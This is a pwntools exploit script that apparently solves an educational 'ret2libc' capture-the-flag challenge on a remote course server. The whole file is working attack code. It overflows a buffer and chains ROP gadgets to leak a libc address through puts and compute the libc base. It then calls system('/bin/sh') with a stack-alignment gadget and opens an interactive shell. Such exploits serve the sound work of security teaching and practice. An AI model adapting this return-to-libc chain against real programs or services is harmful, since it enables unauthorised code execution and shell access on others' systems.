from pwn import *

context.arch = 'amd64'

# p = process('./ret2libc')
p = remote('edu-ctf.csie.org', 10175)

puts_plt = 0x400520
gets_plt = 0x400530

libc_start_main_got = 0x600ff0
main = 0x400698

bss = 0x6b6000

pop_rdi = 0x400733


chain = b''
chain += p64(pop_rdi)
chain += p64(libc_start_main_got)
chain += p64(puts_plt)
chain += p64(main)

p.sendline(b'A' * 0x38 + chain)
p.recvline()
libc_start_main = u64(p.recv(6) + b'\0\0')

# from `readelf -s libc.so | grep libc_start`
# 2203: 0000000000021ab0   446 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5

libc_base = libc_start_main - 0x21ab0
log.success('*** libc base: %s', hex(libc_base))

system_libc = libc_base + 0x4f440

libc = ELF('./libc.so')
bin_sh_str = libc_base + next(libc.search('/bin/sh'))
log.success('*** bin/sh str offset: %s', hex(next(libc.search('/bin/sh'))))

# at main now, again

chain = b''
# NOTE: not adding this line WILL CRASH when calling system()!
#       should add a dummy "ret;" to pop off a return addr
chain += p64(0x400506)
chain += p64(pop_rdi)
chain += p64(bin_sh_str)
chain += p64(system_libc)

p.sendlineafter(':D', b'A' * 0x38 + chain)

p.interactive()
